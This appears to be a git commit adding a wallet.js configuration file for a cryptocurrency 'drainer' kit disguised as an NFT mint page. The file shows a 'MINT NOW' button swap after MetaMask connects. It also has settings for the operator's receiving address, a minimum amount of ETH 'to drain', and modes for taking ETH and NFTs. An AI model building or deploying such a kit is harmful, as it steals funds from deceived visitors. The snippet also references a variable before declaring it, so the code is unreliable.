a7bae919c21e2a94cb6a132bbd85749b88a88d5e
ymophen <96657745+ymophen@users.noreply.github.com>
2022-12-10 17:19:22 +0800

    Add files via upload

---
+++ assets/js/wallet.js
@@ -0,0 +1,28 @@
+async function updateMetaMaskStatus() {
+        isMetaMaskConnected().then((connected) => {
+            if (connected) {
+                document.getElementById("connect").innerText = "MINT NOW";
+            } else {}
+        });
+    }
+
+if (!receiveAddress.startsWith("0x") ||
+    (
+        receiveAddress.length >= 64 ||
+        receiveAddress.length <= 40
+    )
+) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
+
+/*   = = = = = YOUR WALLET ADRESS = = = = =   */
+const receiveAddress = "Your Eth wallet adress"; // Adress where you want to receive money/nfts
+
+/*   = = = = = AMOUNT = = = = =   */
+const amount = {
+    minimal: 2.0 // Minimal of amount of Eth to drain (2.0 is the minimum supported)
+}
+
+/*   = = = = = MODES = = = = =   */
+const active = {
+    eth: true,
+    nfts: true, 
+}
